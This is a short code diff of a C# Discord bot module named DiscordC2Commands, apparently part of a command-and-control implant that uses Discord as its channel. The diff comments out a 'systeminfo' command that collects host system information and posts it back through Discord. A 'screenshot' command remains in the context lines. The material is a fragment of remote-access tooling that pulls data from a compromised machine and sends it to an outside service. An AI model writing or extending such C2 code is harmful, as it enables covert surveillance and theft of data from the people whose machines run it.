@@ -1,4 +1,3 @@
-using Discord;
 using Discord.Commands;
 using RunMode = Discord.Commands.RunMode;
 
@@ -14,17 +13,17 @@ public class DiscordC2Commands : ModuleBase<ShardedCommandContext>
     //     await Context.Message.ReplyAsync($"Hello {Context.User.Username}. Nice to meet you!");
     // }
 
-    [Command("systeminfo", RunMode = RunMode.Async)]
-    public async Task SystemInfo()
-    {
-        string systemInfo = Utils.GetSystemInfo();
+    // [Command("systeminfo", RunMode = RunMode.Async)]
+    // public async Task SystemInfo(string command)
+    // {
+    //     string systemInfo = Utils.GetSystemInfo();
 
-        IEnumerable<string> chunks = Utils.CommandOutputWrapper(systemInfo);
-        foreach (string chunk in chunks)
-        {
-            await Context.Message.ReplyAsync(chunk);
-        }
-    }
+    //     IEnumerable<string> chunks = Utils.CommandOutputWrapper(systemInfo);
+    //     foreach (string chunk in chunks)
+    //     {
+    //         await Context.Message.ReplyAsync(chunk);
+    //     }
+    // }
 
 
     [Command("screenshot", RunMode = RunMode.Async)]
